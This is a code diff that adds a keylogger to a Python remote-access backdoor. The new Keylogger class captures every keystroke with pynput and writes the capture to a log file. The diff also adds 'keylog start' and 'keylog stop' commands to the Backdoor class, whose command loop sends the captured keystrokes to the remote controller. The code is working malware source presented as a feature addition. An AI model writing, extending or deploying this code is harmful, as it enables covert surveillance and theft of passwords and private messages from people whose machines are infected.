@@ -5,6 +5,9 @@ from cryptography.hazmat.primitives.asymmetric import dh
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.kdf.hkdf import HKDF
 from cryptography.hazmat.primitives import hashes
+from pynput import keyboard
+import threading
+import time
 
 class KeyExchange:
     def __init__(self):
@@ -104,7 +107,58 @@ class Encrypto:
     def __str__(self) -> str:
         return "Encrypto"
 
-
+class Keylogger:
+    def __init__(self):
+        self.log = ""
+        self.listener = None
+        self.is_running = False
+        self.log_file = "keylog.txt"
+        
+    def on_press(self, key):
+        try:
+            if hasattr(key, 'char'):
+                self.log += key.char
+            elif key == keyboard.Key.space:
+                self.log += " "
+            elif key == keyboard.Key.enter:
+                self.log += "\n"
+            elif key == keyboard.Key.tab:
+                self.log += "\t"
+            elif key == keyboard.Key.backspace:
+                self.log = self.log[:-1]
+            else:
+                self.log += f" [{key}] "
+        except Exception as e:
+            print(f"Error in key press: {str(e)}")
+            
+    def on_release(self, key):
+        if key == keyboard.Key.esc:
+            return False
+            
+    def start(self):
+        if not self.is_running:
+            self.is_running = True
+            self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
+            self.listener.start()
+            return "Keylogger started successfully!"
+        return "Keylogger is already running!"
+        
+    def stop(self):
+        if self.is_running:
+            self.is_running = False
+            if self.listener:
+                self.listener.stop()
+            # Save the log to file
+            try:
+                with open(self.log_file, 'a', encoding='utf-8') as f:
+                    f.write(f"\n=== Keylog Session {time.strftime('%Y-%m-%d %H:%M:%S')} ===\n")
+                    f.write(self.log)
+                log_content = self.log
+                self.log = ""  # Clear the log
+                return f"Keylogger stopped. Log saved to {self.log_file}\n\nCaptured keystrokes:\n{log_content}"
+            except Exception as e:
+                return f"Error saving keylog: {str(e)}"
+        return "Keylogger is not running!"
 
 class Backdoor:
     def __init__(self,ip,port):        
@@ -125,6 +179,8 @@ class Backdoor:
             return
         # Initialize encryption with shared key
         self.encrypto = Encrypto(self.shared_key)
+        # Initialize keylogger
+        self.keylogger = Keylogger()
 
     
     def listOfProcesses(self):
@@ -343,6 +399,14 @@ class Backdoor:
 
                 elif command[0].lower() == "remove" and len(command) > 1:
                     self.send(self.removeFile(command[1]))
+
+                elif command[0].lower() == "keylog" and len(command) > 1:
+                    if command[1].lower() == "start":
+                        self.send(self.keylogger.start())
+                    elif command[1].lower() == "stop":
+                        self.send(self.keylogger.stop())
+                    else:
+                        self.send("Invalid keylog command. Use 'keylog start' or 'keylog stop'")
                 
                 elif command[0].lower() == "shutdown" and len(command) == 1:
                     self.shutDown()
